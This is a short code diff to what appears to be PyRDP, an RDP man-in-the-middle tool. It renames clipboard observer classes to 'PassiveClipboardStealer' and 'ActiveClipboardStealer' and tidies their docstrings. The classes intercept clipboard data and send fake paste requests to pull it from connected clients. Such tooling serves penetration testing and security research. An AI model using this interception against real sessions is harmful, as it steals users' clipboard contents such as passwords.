@@ -9,9 +9,9 @@ from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU
 from pyrdp.recording import Recorder
 
 
-class PassiveClipboardChannelObserver(Observer):
+class PassiveClipboardStealer(Observer):
     """
-    MITM observer that passively intercept clipboard data from the Clipboard virtual channel as they
+    MITM observer that passively intercepts clipboard data from the clipboard virtual channel as they
     get transferred.
     """
 
@@ -54,14 +54,13 @@ class PassiveClipboardChannelObserver(Observer):
                 self.forwardNextDataResponse = True
 
 
-class ActiveClipboardChannelObserver(PassiveClipboardChannelObserver):
+class ActiveClipboardStealer(PassiveClipboardStealer):
     """
-    Observer that actively sends fake paste requests when its client sends a clipboard changed (FORMAT_LIST_RESPONSE)
-    packet.
+    Observer that actively sends fake paste requests when the client sends a clipboard changed packet (FORMAT_LIST_RESPONSE).
     """
 
     def __init__(self, layer, recorder, logger: Logger, **kwargs):
-        PassiveClipboardChannelObserver.__init__(self, layer, recorder, logger, **kwargs)
+        PassiveClipboardStealer.__init__(self, layer, recorder, logger, **kwargs)
 
     def onPDUReceived(self, pdu: ClipboardPDU):
         """
@@ -70,7 +69,7 @@ class ActiveClipboardChannelObserver(PassiveClipboardChannelObserver):
         the connection crash.
         For every other messages, just transfer the message normally.
         """
-        PassiveClipboardChannelObserver.onPDUReceived(self, pdu)
+        PassiveClipboardStealer.onPDUReceived(self, pdu)
         if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
             self.sendPasteRequest()
 
